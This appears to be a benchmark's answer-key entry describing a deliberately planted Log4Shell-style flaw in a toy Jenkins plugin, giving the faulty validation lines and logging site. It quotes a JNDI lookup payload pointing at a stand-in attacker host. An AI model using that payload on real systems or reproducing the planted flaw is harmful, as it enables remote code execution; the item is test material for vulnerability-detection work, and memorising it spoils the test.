@@ -1,0 +1,37 @@
+id: cpv_22
+name: Logic Error Enabling Log4Shell JNDI Injection
+
+origin: 1-day
+
+release_date: 12/10/2021
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+
+cwes:
+- CWE-917
+- CWE-20
+- CWE-400
+
+description: |
+  A combination of two flaws enables a Log4Shell-style JNDI injection attack.
+  First, a logic error in input validation at lines 45-46 uses AND (&&) instead
+  of OR (||), allowing an attacker to bypass validation by providing a valid
+  name with a malicious password. Second, the unsanitized password is logged
+  directly at line 58 using logger.error(), which triggers Log4j2 to evaluate
+  JNDI lookup expressions like ${jndi:ldap://attacker.com/evil}. This enables
+  remote code execution or data exfiltration via the Log4Shell vulnerability
+  (CVE-2021-44228).
+
+locations:
+- type: root_cause
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+  function_name: doCheck
+  startLine: 45
+  endLine: 46
+- type: crash_site
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+  function_name: doCheck
+  startLine: 58
+  endLine: 58
